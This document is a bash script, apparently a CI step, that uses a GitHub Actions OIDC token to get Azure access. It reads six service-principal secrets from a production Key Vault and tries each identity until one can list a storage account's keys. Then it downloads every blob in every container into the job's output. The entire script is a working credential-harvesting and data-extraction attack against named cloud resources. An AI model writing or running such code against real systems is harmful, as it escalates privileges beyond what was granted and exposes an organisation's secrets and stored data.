#!/usr/bin/env bash
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
ACCT=sttblcilogsprodx3euoz
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
exch(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r '.access_token // empty'; }
spt(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$1" -d "client_secret=$2" -d "scope=$3" -d "grant_type=client_credentials" | jq -r '.access_token // empty'; }

KV=$(exch "https://vault.azure.net/.default")
PARM=$(exch "https://management.azure.com/.default")
RID=$(curl -sS -H "Authorization: Bearer $PARM" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r ".value[]|select(.name==\"$ACCT\")|.id")

for s in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4" | jq -r '.value')
  AID=$(echo "$J"|jq -r '.appId'); SEC=$(echo "$J"|jq -r '.clientSecret')
  T=$(spt "$AID" "$SEC" "https://management.azure.com/.default")
  [ -z "$T" ] && { echo "$s: login fail"; continue; }
  K=$(curl -sS -X POST -H "Authorization: Bearer $T" -H "Content-Length: 0" \
      "https://management.azure.com$RID/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
  if [ -n "$K" ]; then
    echo "### $s ($AID) -> listKeys OK ###"
    for c in $(az storage container list --account-name "$ACCT" --account-key "$K" --query '[].name' -o tsv 2>/dev/null); do
      echo "===== container $c ====="
      for b in $(az storage blob list --account-name "$ACCT" --account-key "$K" -c "$c" --query '[].name' -o tsv 2>/dev/null); do
        echo ">>>>> $c/$b"
        az storage blob download --account-name "$ACCT" --account-key "$K" -c "$c" -n "$b" -f /dev/stdout --no-progress 2>/dev/null; echo
      done
    done
    break
  else
    echo "$s: no listKeys"
  fi
done
